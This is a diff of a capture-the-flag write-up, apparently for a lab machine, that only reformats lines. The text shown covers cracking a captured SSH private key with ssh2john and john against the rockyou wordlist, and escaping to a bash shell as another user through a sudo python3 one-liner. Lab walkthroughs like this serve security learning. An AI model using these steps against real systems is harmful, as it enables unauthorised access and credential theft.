@@ -89,7 +89,11 @@ drwxrwxr-x 2 nair0lf32 docker 4096  2 avril  2020 .ssh
 ```
 
 We have access to the .ssh folder with amir's private id_rsa key. We crack that:  
-First we use `python2 /usr/share/john/ssh2john.py id_rsa > id_rsa.john` to get a john formatted hash file, then we run john on the hash file:
+First we use: 
+
+`python2 /usr/share/john/ssh2john.py id_rsa > id_rsa.john` 
+
+to get a john formatted hash file, then we run john on the hash file:
 
 ```
 john -w=/usr/share/wordlists/rockyou.txt id_rsa.john
@@ -144,6 +148,7 @@ sudo -u amy /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
 
 And now we are amy. We get User Flag in amy's home folder:  
 `cat access.txt`
+
 Now its Privilege Escalation time:
 
 ```
